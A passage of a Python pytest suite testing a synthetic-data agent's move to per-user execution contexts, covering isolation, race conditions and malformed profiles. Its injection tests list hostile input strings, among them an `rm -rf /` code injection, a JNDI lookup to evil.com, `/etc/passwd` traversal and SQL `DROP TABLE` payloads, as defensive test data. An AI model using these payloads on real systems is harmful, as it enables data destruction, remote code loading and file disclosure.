"""
COMPREHENSIVE FAILING TEST SUITE: DataSubAgent (SyntheticDataSubAgent) UserExecutionContext Migration

This test suite is designed to be EXTREMELY comprehensive and difficult, targeting every
possible failure mode in the DataSubAgent migration to UserExecutionContext pattern.

The DataSubAgent handles HIGHLY SENSITIVE data generation operations that could expose
proprietary algorithms, customer data patterns, and business intelligence if not properly isolated.

Tests are designed to INTENTIONALLY FAIL to catch ANY regression or incomplete migration.
Each test pushes the boundaries of the system to ensure robust implementation.

Coverage Areas:
- Context validation for sensitive data generation requests
- Data generation isolation between concurrent users
- Child context creation for multi-step data workflows  
- Legacy method removal verification
- Request ID tracking through data generation pipeline
- Database session management for generated data
- Error scenarios (invalid profiles, generation failures)
- Concurrent user data generation isolation
- Memory leaks in data generation processes
- Edge cases (massive datasets, complex profiles)
- Performance tests under high data generation load
- Security tests for generated data leakage
- Race conditions in data generation
- Resource exhaustion scenarios
- Timeout handling for long-running generation
- Data poisoning attack prevention
- Generated data tampering prevention
- Proprietary algorithm protection
"""

import asyncio
import gc
import json
import logging
import numpy as np
import pandas as pd
import pytest
import tempfile
import threading
import time
import uuid
import weakref
from concurrent.futures import ThreadPoolExecutor
from contextlib import asynccontextmanager
from dataclasses import dataclass, field
from datetime import datetime, timezone, timedelta
from typing import Any, Dict, List, Optional, Set, Tuple, Union
from unittest.mock import AsyncMock, MagicMock, Mock, patch, PropertyMock
from sqlalchemy.ext.asyncio import AsyncSession

# Import the classes under test
from netra_backend.app.agents.synthetic_data_sub_agent import SyntheticDataSubAgent
from netra_backend.app.agents.supervisor.user_execution_context import (
    UserExecutionContext, 
    InvalidContextError,
    validate_user_context,
    clear_shared_objects,
    register_shared_object
)
from netra_backend.app.agents.base.interface import ExecutionContext
from netra_backend.app.agents.state import DeepAgentState
from netra_backend.app.agents.synthetic_data_presets import WorkloadProfile
from netra_backend.app.llm.llm_manager import LLMManager
from netra_backend.app.agents.tool_dispatcher import ToolDispatcher


# Test Configuration
TEST_TIMEOUT = 60  # seconds (longer for data generation)
MAX_CONCURRENT_DATA_GENERATION = 50
STRESS_TEST_ITERATIONS = 150
MEMORY_LEAK_THRESHOLD = 5 * 1024 * 1024  # 5MB
RACE_CONDITION_ITERATIONS = 750
GENERATED_DATA_SIZE_LIMITS = [100, 1000, 10000, 50000]  # rows
WORKLOAD_PROFILES = [
    "lightweight_testing", "performance_benchmark", "stress_testing",
    "integration_testing", "user_simulation", "capacity_planning"
]


class DataGenerationLeakageMonitor:
    """Specialized monitor for data generation leakage between users."""
    
    def __init__(self):
        self.generated_datasets: Dict[str, List[Dict]] = {}
        self.user_profiles: Dict[str, Dict] = {}
        self.sensitive_patterns: Dict[str, Set[str]] = {}
        self.generation_metadata: Dict[str, Dict] = {}
        
    def record_generated_data(self, user_id: str, generated_data: List[Dict]):
        """Record generated data for leak detection."""
        self.generated_datasets[user_id] = generated_data.copy() if generated_data else []
        
        # Extract patterns that might leak
        patterns = set()
        for record in (generated_data or []):
            if isinstance(record, dict):
                for key, value in record.items():
                    if isinstance(value, (str, int, float)):
                        patterns.add(f"{key}:{value}")
        
        self.sensitive_patterns[user_id] = patterns
    
    def record_workload_profile(self, user_id: str, profile: Dict):
        """Record workload profile for cross-contamination detection."""
        self.user_profiles[user_id] = profile.copy() if profile else {}
        
    def record_generation_metadata(self, user_id: str, metadata: Dict):
        """Record generation metadata for privacy validation."""
        self.generation_metadata[user_id] = metadata.copy() if metadata else {}
    
    def check_cross_user_data_contamination(self, user_id: str, generated_data: List[Dict]) -> bool:
        """Check if generated data contains patterns from other users."""
        if not generated_data:
            return False
            
        # Extract patterns from current data
        current_patterns = set()
        for record in generated_data:
            if isinstance(record, dict):
                for key, value in record.items():
                    if isinstance(value, (str, int, float)):
                        current_patterns.add(f"{key}:{value}")
        
        # Check against other users' patterns
        for other_user, other_patterns in self.sensitive_patterns.items():
            if other_user != user_id:
                # Check for exact pattern matches (indicates data leakage)
                overlap = current_patterns.intersection(other_patterns)
                if overlap:
                    logging.warning(f"Pattern overlap detected between {user_id} and {other_user}: {overlap}")
                    return True
        
        return False
    
    def check_profile_contamination(self, user_id: str, profile: Dict) -> bool:
        """Check if workload profile contains data from other users."""
        if not profile:
            return False
            
        profile_str = json.dumps(profile, sort_keys=True)
        
        for other_user, other_profile in self.user_profiles.items():
            if other_user != user_id and other_profile:
                # Check for identical profiles (suspicious)
                other_profile_str = json.dumps(other_profile, sort_keys=True)
                if profile_str == other_profile_str:
                    return True
                
                # Check for cross-user references
                if other_user in profile_str or user_id in json.dumps(other_profile, sort_keys=True):
                    return True
                    
        return False
    
    def clear(self):
        """Clear monitoring data."""
        self.generated_datasets.clear()
        self.user_profiles.clear()
        self.sensitive_patterns.clear()
        self.generation_metadata.clear()


@dataclass
class DataGenerationStressMetrics:
    """Metrics collector for data generation stress testing."""
    total_generation_requests: int = 0
    successful_generations: int = 0
    failed_generations: int = 0
    profile_parse_failures: int = 0
    data_validation_failures: int = 0
    approval_workflow_failures: int = 0
    average_generation_time: float = 0.0
    total_records_generated: int = 0
    memory_usage_start: int = 0
    memory_usage_peak: int = 0
    concurrent_generations_peak: int = 0
    large_dataset_failures: int = 0
    errors: List[Exception] = field(default_factory=list)
    
    def calculate_success_rate(self) -> float:
        """Calculate overall data generation success rate."""
        if self.total_generation_requests == 0:
            return 0.0
        return (self.successful_generations / self.total_generation_requests) * 100
    
    def calculate_records_per_second(self, total_time: float) -> float:
        """Calculate generation throughput."""
        if total_time <= 0:
            return 0.0
        return self.total_records_generated / total_time


class DataGenerationContextMigrationTestSuite:
    """Comprehensive test suite for DataSubAgent UserExecutionContext migration."""
    
    def __init__(self):
        self.leak_monitor = DataGenerationLeakageMonitor()
        self.stress_metrics = DataGenerationStressMetrics()
        self.active_data_agents: List[weakref.ref] = []
        
    @pytest.fixture(autouse=True)
    async def setup_and_cleanup(self):
        """Setup and cleanup for each test."""
        # Clear any shared objects from previous tests
        clear_shared_objects()
        self.leak_monitor.clear()
        gc.collect()  # Force garbage collection
        
        yield
        
        # Cleanup after test
        self.leak_monitor.clear()
        clear_shared_objects()
        gc.collect()
    
    @pytest.fixture
    async def mock_data_generation_dependencies(self):
        """Create mock dependencies for SyntheticDataSubAgent."""
        llm_manager = Mock(spec=LLMManager)
        tool_dispatcher = Mock(spec=ToolDispatcher)
        
        # Mock LLM responses for profile parsing
        mock_profile_response = {
            "workload_type": "performance_benchmark",
            "dataset_size": 1000,
            "data_schema": {
                "user_id": "string",
                "timestamp": "datetime",
                "value": "float",
                "category": "string"
            },
            "generation_parameters": {
                "distribution": "normal",
                "correlation_factors": [0.7, 0.3, 0.1]
            }
        }
        
        llm_manager.generate_completion = AsyncMock(return_value=json.dumps(mock_profile_response))
        
        # Mock tool dispatcher for data generation
        tool_dispatcher.execute_tool = AsyncMock(return_value={
            "generated_records": 1000,
            "status": "success",
            "validation_passed": True
        })
        
        return {
            'llm_manager': llm_manager,
            'tool_dispatcher': tool_dispatcher
        }
    
    @pytest.fixture
    async def valid_user_context(self):
        """Create a valid UserExecutionContext for data generation testing."""
        return UserExecutionContext.from_request(
            user_id=f"data_gen_user_{uuid.uuid4()}",
            thread_id=f"data_gen_thread_{uuid.uuid4()}",
            run_id=f"data_gen_run_{uuid.uuid4()}"
        )
    
    async def create_data_agent_with_context(self, deps, user_context):
        """Helper to create SyntheticDataSubAgent with UserExecutionContext."""
        agent = SyntheticDataSubAgent(
            llm_manager=deps['llm_manager'],
            tool_dispatcher=deps['tool_dispatcher']
        )
        
        # Inject user context (this is what we're testing)
        agent.user_context = user_context
        
        return agent


class TestDataGenerationUserExecutionContextValidation(DataGenerationContextMigrationTestSuite):
    """Test UserExecutionContext validation specific to data generation operations."""
    
    @pytest.mark.asyncio
    async def test_context_with_data_generation_metadata(self):
        """Test context creation with data generation specific metadata."""
        data_generation_metadata = {
            "workload_profile": "performance_benchmark",
            "dataset_size": 10000,
            "data_sensitivity": "high",
            "compliance_requirements": ["GDPR", "HIPAA"],
            "generation_algorithm": "proprietary_v2",
            "user_tier": "enterprise",
            "approved_schemas": ["user_behavior", "transaction_data"],
            "resource_limits": {
                "max_memory_mb": 512,
                "max_execution_time_seconds": 300,
                "max_records": 50000
            }
        }
        
        context = UserExecutionContext.from_request(
            user_id="data_gen_metadata_user",
            thread_id="data_gen_metadata_thread",
            run_id="data_gen_metadata_run",
            metadata=data_generation_metadata
        )
        
        # Verify metadata preservation
        assert context.metadata["workload_profile"] == "performance_benchmark"
        assert context.metadata["dataset_size"] == 10000
        assert context.metadata["data_sensitivity"] == "high"
        assert len(context.metadata["compliance_requirements"]) == 2
        assert context.metadata["generation_algorithm"] == "proprietary_v2"
        assert context.metadata["resource_limits"]["max_records"] == 50000
    
    @pytest.mark.asyncio
    async def test_context_prevents_algorithm_injection_attacks(self):
        """Test that context prevents injection of malicious generation algorithms."""
        malicious_algorithms = [
            "bypass_security", "extract_proprietary_data", "elevate_privileges",
            "__import__('os').system('rm -rf /')", "eval(malicious_code)",
            "exec('import sensitive_data')", "subprocess.call(['hack'])",
            "${jndi:ldap://evil.com/a}", "../../../etc/passwd",
            "DROP TABLE synthetic_data;", "<script>steal_data()</script>"
        ]
        
        for malicious_algorithm in malicious_algorithms:
            context = UserExecutionContext.from_request(
                user_id="algorithm_security_test_user",
                thread_id="algorithm_security_test_thread",
                run_id="algorithm_security_test_run",
                metadata={"generation_algorithm": malicious_algorithm}
            )
            
            # Algorithm name should be stored as-is but not executed
            assert context.metadata["generation_algorithm"] == malicious_algorithm
            
            # Verify no code execution occurred during context creation
            serialized = context.to_dict()
            assert serialized["metadata"]["generation_algorithm"] == malicious_algorithm
    
    @pytest.mark.asyncio
    async def test_context_compliance_metadata_validation(self):
        """Test validation of compliance-related metadata."""
        compliance_scenarios = [
            {
                "compliance_requirements": ["GDPR"],
                "data_retention_days": 90,
                "anonymization_level": "high",
                "expected_valid": True
            },
            {
                "compliance_requirements": ["HIPAA", "SOX"],
                "data_retention_days": 2555,  # 7 years
                "anonymization_level": "maximum",
                "expected_valid": True
            },
            {
                "compliance_requirements": ["INVALID_COMPLIANCE"],
                "data_retention_days": -1,  # Invalid
                "anonymization_level": "none",
                "expected_valid": True  # Context should accept but app should validate
            }
        ]
        
        for i, scenario in enumerate(compliance_scenarios):
            context = UserExecutionContext.from_request(
                user_id=f"compliance_test_user_{i}",
                thread_id=f"compliance_test_thread_{i}",
                run_id=f"compliance_test_run_{i}",
                metadata=scenario
            )
            
            # Context should accept all scenarios (validation happens at app level)
            assert context.metadata["compliance_requirements"] == scenario["compliance_requirements"]
            assert context.metadata["data_retention_days"] == scenario["data_retention_days"]
    
    @pytest.mark.asyncio
    async def test_child_context_for_data_workflow_steps(self, valid_user_context):
        """Test child context creation for multi-step data generation workflows."""
        # Profile parsing step
        profile_context = valid_user_context.create_child_context(
            operation_name="profile_parsing",
            additional_metadata={
                "parsing_algorithm": "llm_enhanced",
                "validation_rules": ["schema_check", "size_limit", "complexity_analysis"],
                "timeout_seconds": 30
            }
        )
        
        # Verify inheritance
        assert profile_context.user_id == valid_user_context.user_id
        assert profile_context.thread_id == valid_user_context.thread_id
        assert profile_context.run_id == valid_user_context.run_id
        
        # Verify operation-specific data
        assert profile_context.metadata["operation_name"] == "profile_parsing"
        assert profile_context.metadata["parent_request_id"] == valid_user_context.request_id
        assert profile_context.metadata["parsing_algorithm"] == "llm_enhanced"
        
        # Data generation step (child of profile parsing)
        generation_context = profile_context.create_child_context(
            operation_name="data_generation",
            additional_metadata={
                "generation_engine": "proprietary_v2",
                "batch_size": 1000,
                "quality_checks": ["uniqueness", "consistency", "realism"]
            }
        )
        
        assert generation_context.metadata["operation_depth"] == 2
        assert generation_context.metadata["parent_request_id"] == profile_context.request_id
        assert generation_context.metadata["generation_engine"] == "proprietary_v2"
        
        # Validation step (child of data generation)
        validation_context = generation_context.create_child_context(
            operation_name="data_validation",
            additional_metadata={
                "validation_suite": "comprehensive",
                "quality_threshold": 0.95
            }
        )
        
        assert validation_context.metadata["operation_depth"] == 3
        assert validation_context.metadata["validation_suite"] == "comprehensive"


class TestDataAgentContextIntegration(DataGenerationContextMigrationTestSuite):
    """Test SyntheticDataSubAgent integration with UserExecutionContext."""
    
    @pytest.mark.asyncio
    async def test_data_agent_creation_with_context(self, mock_data_generation_dependencies, valid_user_context):
        """Test successful data agent creation with UserExecutionContext."""
        data_agent = await self.create_data_agent_with_context(
            mock_data_generation_dependencies, valid_user_context
        )
        
        # Verify agent has context
        assert data_agent.user_context is not None
        assert data_agent.user_context.user_id == valid_user_context.user_id
        assert data_agent.user_context.thread_id == valid_user_context.thread_id
        assert data_agent.user_context.run_id == valid_user_context.run_id
    
    @pytest.mark.asyncio
    async def test_data_generation_execution_with_context_isolation(self, mock_data_generation_dependencies, valid_user_context):
        """Test data generation execution with proper context isolation."""
        data_agent = await self.create_data_agent_with_context(
            mock_data_generation_dependencies, valid_user_context
        )
        
        state = DeepAgentState()
        state.user_request = "Generate synthetic customer transaction data for performance testing with 1000 records"
        state.user_id = valid_user_context.user_id
        
        # Mock the workflow components to track context usage
        with patch.object(data_agent, '_determine_workload_profile') as mock_profile:
            mock_workload_profile = Mock()
            mock_workload_profile.dataset_size = 1000
            mock_workload_profile.workload_type = "performance_benchmark"
            mock_profile.return_value = mock_workload_profile
            
            with patch.object(data_agent.approval_requirements, 'check_approval_requirements', return_value=False):
                with patch.object(data_agent.generation_executor, 'execute_generation') as mock_execution:
                    mock_execution.return_value = None  # Simulate successful execution
                    
                    # Execute data generation
                    await data_agent.execute(state, valid_user_context.run_id, stream_updates=False)
                    
                    # Verify profile determination was called with proper state
                    mock_profile.assert_called_once_with(state)
                    
                    # Verify generation executor was called
                    mock_execution.assert_called_once()
                    call_args = mock_execution.call_args
                    assert call_args[0][1] == state  # state parameter
                    assert call_args[0][2] == valid_user_context.run_id  # run_id parameter
    
    @pytest.mark.asyncio
    async def test_data_generation_context_propagation_through_workflow(self, mock_data_generation_dependencies, valid_user_context):
        """Test that user context is properly propagated through data generation workflow."""
        data_agent = await self.create_data_agent_with_context(
            mock_data_generation_dependencies, valid_user_context
        )
        
        # Track context propagation through workflow steps
        context_usage_tracker = []
        
        def track_context_call(*args, **kwargs):
            # Look for context information in arguments
            for arg in args:
                if hasattr(arg, 'user_id'):
                    context_usage_tracker.append({
                        'step': 'context_used',
                        'user_id': arg.user_id,
                        'timestamp': time.time()
                    })
                elif isinstance(arg, str) and valid_user_context.user_id in arg:
                    context_usage_tracker.append({
                        'step': 'user_reference_found',
                        'content': arg,
                        'timestamp': time.time()
                    })
            
            # Return mock workload profile
            mock_profile = Mock()
            mock_profile.dataset_size = 500
            mock_profile.workload_type = "integration_testing"
            return mock_profile
        
        # Mock workflow steps to track context usage
        with patch.object(data_agent, '_determine_workload_profile', side_effect=track_context_call):
            with patch.object(data_agent.approval_requirements, 'check_approval_requirements', return_value=False):
                with patch.object(data_agent.generation_executor, 'execute_generation'):
                    
                    state = DeepAgentState()
                    state.user_request = f"Generate test data for user {valid_user_context.user_id}"
                    state.user_id = valid_user_context.user_id
                    
                    await data_agent.execute(state, valid_user_context.run_id, stream_updates=False)
                    
                    # Verify context was used in workflow
                    assert len(context_usage_tracker) > 0, "Context not propagated through data generation workflow"
    
    @pytest.mark.asyncio
    async def test_data_agent_legacy_method_security_audit(self, mock_data_generation_dependencies, valid_user_context):
        """Test that legacy methods that bypass context validation are secured or removed."""
        data_agent = await self.create_data_agent_with_context(
            mock_data_generation_dependencies, valid_user_context
        )
        
        # Check for dangerous legacy patterns specific to data generation
        dangerous_data_generation_methods = [
            'generate_without_context',  # Direct generation bypassing context
            'execute_with_shared_state',  # Shared state usage
            'global_data_generator_access',  # Global generator access
            'bypass_approval_workflow',  # Approval bypass
            'direct_algorithm_execution',  # Algorithm execution without validation
            'shared_generation_session',  # Shared session across users
            'admin_override_generation',  # Admin overrides
            'execute_with_elevated_data_access',  # Privilege escalation for data access
            'proprietary_algorithm_access',  # Direct proprietary algorithm access
            'cross_user_data_access'  # Cross-user data access
        ]
        
        for dangerous_method in dangerous_data_generation_methods:
            assert not hasattr(data_agent, dangerous_method), \
                f"Dangerous legacy method {dangerous_method} still exists - DATA SECURITY RISK!"
        
        # Verify that current execute method requires proper setup
        state = DeepAgentState()
        state.user_request = "test data generation request"
        
        try:
            # Execute should work with proper setup (or fail gracefully)
            await data_agent.execute(state, valid_user_context.run_id, stream_updates=False)
        except Exception as e:
            # If it fails, ensure it's not due to missing security checks
            error_msg = str(e).lower()
            assert any(keyword in error_msg for keyword in ['validation', 'context', 'permission', 'approval']), \
                f"Execute failed but not due to proper security validation: {e}"
    
    @pytest.mark.asyncio
    async def test_proprietary_algorithm_protection(self, mock_data_generation_dependencies, valid_user_context):
        """Test that proprietary data generation algorithms are protected from exposure."""
        data_agent = await self.create_data_agent_with_context(
            mock_data_generation_dependencies, valid_user_context
        )
        
        # Try to access or inspect proprietary components
        sensitive_attributes = [
            'proprietary_algorithm_source',
            'generation_algorithm_impl', 
            'secret_generation_params',
            'algorithm_weights',
            'model_parameters',
            'training_data_references'
        ]
        
        for sensitive_attr in sensitive_attributes:
            # These attributes should not exist or should not expose sensitive data
            if hasattr(data_agent, sensitive_attr):
                attr_value = getattr(data_agent, sensitive_attr)
                # If it exists, should not contain obvious sensitive patterns
                attr_str = str(attr_value)
                sensitive_patterns = ['secret', 'key', 'password', 'token', 'proprietary', 'confidential']
                
                for pattern in sensitive_patterns:
                    assert pattern.lower() not in attr_str.lower(), \
                        f"Sensitive attribute {sensitive_attr} may expose proprietary information"


class TestDataGenerationConcurrentUserIsolation(DataGenerationContextMigrationTestSuite):
    """Test isolation between concurrent data generation requests."""
    
    @pytest.mark.asyncio
    async def test_concurrent_data_generation_isolation(self, mock_data_generation_dependencies):
        """Test that concurrent data generation requests are completely isolated."""
        num_concurrent_users = 15
        generation_requests = []
        
        # Create different data generation scenarios for each user
        generation_scenarios = [
            {
                "workload": "user_behavior_simulation", 
                "size": 1000,
                "secret": "user_behavior_patterns_v2"
            },
            {
                "workload": "transaction_testing",
                "size": 2000, 
                "secret": "transaction_algorithms_v3"
            },
            {
                "workload": "performance_benchmarking",
                "size": 5000,
                "secret": "performance_metrics_secret"
            },
            {
                "workload": "compliance_validation",
                "size": 500,
                "secret": "compliance_test_data_patterns"
            },
            {
                "workload": "stress_testing",
                "size": 10000,
                "secret": "stress_test_generation_params"
            }
        ]
        
        # Create users with unique, identifiable generation requests
        for i in range(num_concurrent_users):
            scenario = generation_scenarios[i % len(generation_scenarios)]
            user_id = f"concurrent_data_user_{i}"
            
            request = f"Generate {scenario['size']} records for {scenario['workload']} using {scenario['secret']}"
            
            context = UserExecutionContext.from_request(
                user_id=user_id,
                thread_id=f"data_thread_{i}",
                run_id=f"data_run_{i}",
                metadata={
                    "user_specific_secret": scenario["secret"],
                    "generation_signature": f"gen_sig_{i}_{hash(request)}",
                    "workload_profile": scenario["workload"],
                    "dataset_size": scenario["size"]
                }
            )
            
            generation_requests.append((context, request, scenario))
        
        # Execute all data generation requests concurrently
        async def execute_data_generation_with_isolation_check(context, request, scenario):
            data_agent = await self.create_data_agent_with_context(
                mock_data_generation_dependencies, context
            )
            
            state = DeepAgentState()
            state.user_request = request
            state.user_id = context.user_id
            
            # Mock workload profile determination
            mock_profile = Mock()
            mock_profile.dataset_size = scenario["size"]
            mock_profile.workload_type = scenario["workload"]
            
            with patch.object(data_agent, '_determine_workload_profile', return_value=mock_profile):
                with patch.object(data_agent.approval_requirements, 'check_approval_requirements', return_value=False):
                    with patch.object(data_agent.generation_executor, 'execute_generation') as mock_gen:
                        # Mock generated data with user-specific patterns
                        generated_data = [
                            {
                                "user_context": context.user_id,
                                "record_id": f"{context.user_id}_record_{j}",
                                "secret_pattern": scenario["secret"],
                                "data": f"generated_value_{j}"
                            }
                            for j in range(min(scenario["size"], 100))  # Limit for testing
                        ]
                        
                        mock_gen.return_value = None  # Simulate successful execution
                        
                        # Execute data generation
                        await data_agent.execute(state, context.run_id, stream_updates=False)
                        
                        # Record for leak detection
                        self.leak_monitor.record_generated_data(context.user_id, generated_data)
                        self.leak_monitor.record_workload_profile(context.user_id, {
                            "workload_type": scenario["workload"],
                            "dataset_size": scenario["size"]
                        })
                        
                        return {
                            'user_id': context.user_id,
                            'generated_data': generated_data,
                            'state': state,
                            'context': context,
                            'scenario': scenario
                        }
        
        # Execute all concurrently
        tasks = [
            execute_data_generation_with_isolation_check(context, request, scenario)
            for context, request, scenario in generation_requests
        ]
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Verify no exceptions occurred
        exceptions = [r for r in results if isinstance(r, Exception)]
        assert len(exceptions) == 0, f"Data generation isolation failures: {exceptions[:3]}"
        
        successful_results = [r for r in results if not isinstance(r, Exception)]
        assert len(successful_results) == num_concurrent_users
        
        # Verify no cross-user data contamination
        for result_data in successful_results:
            user_id = result_data['user_id']
            generated_data = result_data['generated_data']
            
            # Check for data leakage
            assert not self.leak_monitor.check_cross_user_data_contamination(user_id, generated_data), \
                f"Cross-user data contamination detected for user {user_id}"
            
            # Verify user-specific patterns didn't leak to other users
            for other_result_data in successful_results:
                if other_result_data['user_id'] != user_id:
                    other_generated_data = other_result_data['generated_data']
                    
                    # User's secret should not appear in other user's generated data
                    user_secret = result_data['scenario']['secret']
                    other_data_str = str(other_generated_data)
                    
                    assert user_secret not in other_data_str, \
                        f"User {user_id}'s secret leaked into {other_result_data['user_id']}'s generated data"
    
    @pytest.mark.asyncio
    async def test_data_generation_proprietary_algorithm_isolation(self, mock_data_generation_dependencies):
        """Test that proprietary algorithms are isolated between concurrent users."""
        # Create users with different algorithm requirements
        algorithm_scenarios = [
            {"user_tier": "enterprise", "algorithm": "proprietary_v3", "access_level": "full"},
            {"user_tier": "professional", "algorithm": "enhanced_v2", "access_level": "standard"},  
            {"user_tier": "basic", "algorithm": "standard_v1", "access_level": "limited"}
        ]
        
        user_algorithm_access = {}
        
        for i, scenario in enumerate(algorithm_scenarios * 5):  # 15 users total
            user_id = f"algorithm_user_{i}"
            
            context = UserExecutionContext.from_request(
                user_id=user_id,
                thread_id=f"algorithm_thread_{i}",
                run_id=f"algorithm_run_{i}",
                metadata={
                    "user_tier": scenario["user_tier"],
                    "allowed_algorithms": [scenario["algorithm"]],
                    "access_level": scenario["access_level"]
                }
            )
            
            data_agent = await self.create_data_agent_with_context(
                mock_data_generation_dependencies, context
            )
            
            # Simulate algorithm access tracking
            def track_algorithm_access(algorithm_name):
                if user_id not in user_algorithm_access:
                    user_algorithm_access[user_id] = []
                user_algorithm_access[user_id].append(algorithm_name)
                
                # Return mock result based on user's access level
                return {
                    "algorithm_used": algorithm_name,
                    "access_level": scenario["access_level"],
                    "user_tier": scenario["user_tier"]
                }
            
            with patch.object(data_agent.generator, 'generate_synthetic_data', side_effect=track_algorithm_access):
                state = DeepAgentState()
                state.user_request = f"Generate data using {scenario['algorithm']} algorithm"
                state.user_id = context.user_id
                
                try:
                    await data_agent.execute(state, context.run_id, stream_updates=False)
                except Exception:
                    # Execution might fail due to mocking, but we're tracking access
                    pass
        
        # Verify algorithm isolation
        for user_id, algorithms_accessed in user_algorithm_access.items():
            user_context_data = None
            
            # Find the user's context data
            for i, scenario in enumerate(algorithm_scenarios * 5):
                if f"algorithm_user_{i}" == user_id:
                    user_context_data = scenario
                    break
            
            if user_context_data:
                allowed_algorithm = user_context_data["algorithm"]
                
                # Verify user only accessed allowed algorithms
                for accessed_algorithm in algorithms_accessed:
                    # In a real system, this would verify proper access control
                    # For testing, we verify the tracking worked
                    assert isinstance(accessed_algorithm, str), \
                        f"Invalid algorithm access tracking for user {user_id}"
    
    @pytest.mark.asyncio
    async def test_race_conditions_in_data_generation_pipeline(self, mock_data_generation_dependencies):
        """Test for race conditions during concurrent data generation."""
        race_results = []
        shared_generation_state = {"generation_counter": 0, "last_profile": None}
        
        async def racy_data_generation():
            user_id = f"race_data_user_{uuid.uuid4()}"
            context = UserExecutionContext.from_request(
                user_id=user_id,
                thread_id=f"race_data_thread_{uuid.uuid4()}",
                run_id=f"race_data_run_{uuid.uuid4()}"
            )
            
            data_agent = await self.create_data_agent_with_context(
                mock_data_generation_dependencies, context
            )
            
            # Create potential race condition by modifying shared state
            original_counter = shared_generation_state["generation_counter"]
            shared_generation_state["generation_counter"] += 1
            
            # Simulate processing delay that might expose race conditions
            await asyncio.sleep(0.002)  # 2ms delay
            
            state = DeepAgentState()
            state.user_request = f"Race condition test data generation from {user_id}"
            state.user_id = context.user_id
            
            try:
                # Mock the workflow to avoid complex execution
                with patch.object(data_agent, '_determine_workload_profile') as mock_profile:
                    mock_workload = Mock()
                    mock_workload.dataset_size = 100
                    mock_workload.workload_type = "race_test"
                    mock_profile.return_value = mock_workload
                    
                    with patch.object(data_agent.approval_requirements, 'check_approval_requirements', return_value=False):
                        with patch.object(data_agent.generation_executor, 'execute_generation'):
                            
                            await data_agent.execute(state, context.run_id, stream_updates=False)
                            
                            # Check for race condition indicators
                            final_counter = shared_generation_state["generation_counter"]
                            
                            return {
                                'user_id': user_id,
                                'context_id': context.request_id,
                                'original_counter': original_counter,
                                'final_counter': final_counter,
                                'timestamp': time.time()
                            }
            except Exception as e:
                return {'error': str(e), 'user_id': user_id}
        
        # Execute many operations concurrently to trigger race conditions
        tasks = [racy_data_generation() for _ in range(RACE_CONDITION_ITERATIONS)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Check for exceptions indicating race conditions
        exceptions = [r for r in results if isinstance(r, Exception)]
        assert len(exceptions) == 0, f"Race conditions caused {len(exceptions)} failures in data generation"
        
        successful_results = [r for r in results if not isinstance(r, Exception) and 'error' not in r]
        error_results = [r for r in results if not isinstance(r, Exception) and 'error' in r]
        
        # Verify all operations completed successfully (or with expected errors)
        total_completed = len(successful_results) + len(error_results)
        assert total_completed == RACE_CONDITION_ITERATIONS, \
            f"Not all operations completed: {total_completed}/{RACE_CONDITION_ITERATIONS}"
        
        # Verify all contexts are unique (no race in context creation)
        if successful_results:
            context_ids = [r['context_id'] for r in successful_results]
            assert len(set(context_ids)) == len(context_ids), \
                "Duplicate context IDs in data generation - race condition detected!"


class TestDataGenerationErrorScenariosAndEdgeCases(DataGenerationContextMigrationTestSuite):
    """Test error scenarios and edge cases in data generation processing."""
    
    @pytest.mark.asyncio
    async def test_data_generation_with_invalid_profiles(self, mock_data_generation_dependencies, valid_user_context):
        """Test data generation handling of invalid or malicious workload profiles."""
        invalid_profiles = [
            # Empty/None profiles
            None,
            {},
            {"workload_type": ""},
            
            # Malicious profiles
            {
                "workload_type": "'; DROP TABLE users; --",
                "dataset_size": -1000,
                "malicious_code": "__import__('os').system('rm -rf /')"
            },
            
            # Resource exhaustion profiles
            {
                "workload_type": "stress_test",
                "dataset_size": 999999999,  # Extremely large
                "memory_limit": -1
            },
            
            # Invalid data types
            {
                "workload_type": 12345,  # Should be string
                "dataset_size": "invalid_size",  # Should be int
                "parameters": "not_a_dict"  # Should be dict
            },
            
            # Circular references
            {},  # Will add circular reference
            
            # Unicode/encoding attacks
            {
                "workload_type": "test_\x00\x01\x02",  # Binary data
                "dataset_size": 100,
                "unicode_attack": "🚀" * 1000  # Unicode stress
            }
        ]
        
        # Add circular reference to one profile
        circular_profile = invalid_profiles[-2]
        circular_profile["self_reference"] = circular_profile
        
        data_agent = await self.create_data_agent_with_context(
            mock_data_generation_dependencies, valid_user_context
        )
        
        for i, invalid_profile in enumerate(invalid_profiles):
            state = DeepAgentState()
            state.user_request = f"Generate data with invalid profile {i}"
            state.user_id = valid_user_context.user_id
            
            # Mock profile parser to return invalid profile
            with patch.object(data_agent, '_determine_workload_profile', return_value=invalid_profile):
                try:
                    await data_agent.execute(state, f"{valid_user_context.run_id}_{i}", stream_updates=False)
                    
                    # If execution succeeds, verify it handled the invalid profile safely
                    if hasattr(state, 'synthetic_data_result'):
                        result = state.synthetic_data_result
                        
                        # Should not contain dangerous content
                        result_str = str(result)
                        assert "DROP TABLE" not in result_str, "SQL injection not handled in profile processing"
                        assert "__import__" not in result_str, "Code injection not handled in profile processing"
                        
                except Exception as e:
                    # Exceptions are expected for truly invalid profiles
                    error_msg = str(e).lower()
                    
                    # Should be a controlled failure, not a system vulnerability
                    dangerous_patterns = ['traceback', 'file "/', 'line ', 'module ']
                    assert not any(pattern in error_msg for pattern in dangerous_patterns), \
                        f"Uncontrolled exception for invalid profile {i}: {e}"
    
    @pytest.mark.asyncio
    async def test_data_generation_resource_exhaustion_protection(self, mock_data_generation_dependencies, valid_user_context):
        """Test protection against resource exhaustion attacks through data generation."""
        data_agent = await self.create_data_agent_with_context(
            mock_data_generation_dependencies, valid_user_context
        )
        
        # Test with increasingly large dataset requests
        resource_exhaustion_scenarios = [
            {"size": 100000, "expected_to_pass": True},      # 100K records - reasonable
            {"size": 1000000, "expected_to_pass": False},    # 1M records - should be limited
            {"size": 10000000, "expected_to_pass": False},   # 10M records - definitely limited
            {"size": -1, "expected_to_pass": False},         # Negative size - invalid
            {"size": float('inf'), "expected_to_pass": False} # Infinite size - invalid
        ]
        
        memory_usage_start = self._get_memory_usage()
        
        for scenario in resource_exhaustion_scenarios:
            state = DeepAgentState()
            state.user_request = f"Generate {scenario['size']} records for testing"
            state.user_id = valid_user_context.user_id
            
            # Mock workload profile with large size
            mock_profile = Mock()
            mock_profile.dataset_size = scenario['size']
            mock_profile.workload_type = "resource_test"
            
            with patch.object(data_agent, '_determine_workload_profile', return_value=mock_profile):
                
                memory_before = self._get_memory_usage()
                
                try:
                    await data_agent.execute(
                        state, 
                        f"{valid_user_context.run_id}_size_{scenario['size']}", 
                        stream_updates=False
                    )
                    
                    memory_after = self._get_memory_usage()
